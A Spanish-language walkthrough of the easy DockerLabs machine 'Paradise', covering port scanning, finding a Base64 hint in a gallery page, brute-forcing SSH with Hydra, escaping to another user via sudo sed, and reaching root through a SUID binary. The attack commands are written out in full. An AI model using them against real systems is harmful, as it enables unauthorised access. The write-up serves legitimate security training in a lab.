## Introducción

Este documento presenta la resolución completa de la máquina **Paradise**, desarrollada por *kaikoperez* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servidor web que contiene un comentario codificado en Base64 en el código fuente de `galery.html`, revelando un directorio oculto con un mensaje que advierte al usuario `lucas` sobre su contraseña débil. Esta pista permite realizar un ataque de fuerza bruta contra el servicio SSH, obteniendo acceso al sistema como `lucas`.
Una vez dentro, se identifica una configuración insegura de `sudo` que permite ejecutar `sed` como el usuario `andy`, facilitando la escalada a esta cuenta. Finalmente, se encuentra un binario con permisos SUID (`privileged_exec`) que otorga acceso directo a `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Paradise.zip
sudo bash auto_deploy.sh Paradise.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Paradise/{content,exploits,nmap,scripts}
cd Paradise
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP
* **139/tcp** — NetBIOS-SSN
* **445/tcp** — Microsoft-DS

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1762925241/Ports_jpbsw7.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80,139,445 172.17.0.2 -oN targeted
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -x php,html,txt,js -t 200
```

![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1762925240/Gobuster_uhhk4e.png)

**Rutas detectadas:**
- `/img/` — Imágenes de la galería.
- `/login.php` — Formulario que requiere correo y código.
- `/index.html` — Página principal con galería fotográfica.
  ![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1762925240/Index_jeicvp.png)
- `/galery.html` — Galería de fotos con un comentario codificado en Base64 en el código fuente.
  ![Gallery](https://res.cloudinary.com/dewqswzke/image/upload/v1762925239/GalleryCode_l9bvkx.png)
- `/booking.html` — Formulario sencillo que solicita un correo.

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Decodificación de pista

El comentario encontrado en `galery.html`, una vez decodificado desde Base64, revela la cadena:

```
estoesunsecreto
```

Se valida si este texto coincide con un directorio dentro del sitio web. El directorio existe y contiene el archivo `mensajeparalucas`:

![Mensaje para Lucas](https://res.cloudinary.com/dewqswzke/image/upload/v1762925241/MensajeParaLucas_ecwsbr.png)

El mensaje advierte que la contraseña del usuario **lucas** es débil y vulnerable a ataques de fuerza bruta.

### 2.2 Ataque de fuerza bruta SSH

Se utiliza Hydra para realizar un ataque al servicio SSH:

```bash
hydra -l lucas -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64
```

![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1762925240/Hydra_vc9z5j.png)

La contraseña es encontrada con éxito, permitiendo acceso directo al sistema:

```bash
ssh lucas@172.17.0.2
```

![Lucas](https://res.cloudinary.com/dewqswzke/image/upload/v1762925240/Lucas_pdmoda.png)

## Paso 3 — Escalada de privilegios

### 3.1 De lucas → andy

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1762925243/Sudo-lLucas_qmmgce.png)

El usuario puede ejecutar `sed` como `andy` sin contraseña.

Se utiliza `searchbins` para verificar la técnica en GTFOBins:

```bash
searchbins -b sed -f sudo
```

Se ejecuta el comando para obtener una shell como `andy`:

```bash
sudo -u andy sed -n '1e exec sh 1>&0' /etc/hosts
```

![Andy](https://res.cloudinary.com/dewqswzke/image/upload/v1762925239/Andy_lrlq0v.png)

### 3.2 De andy → root

Se buscan binarios con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

![Find](https://res.cloudinary.com/dewqswzke/image/upload/v1762925239/Find_n292d7.png)

Se identifica el binario `/usr/local/bin/privileged_exec`. Se ejecuta:

```bash
/usr/local/bin/privileged_exec
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1762925242/Root_m1fuxg.png)
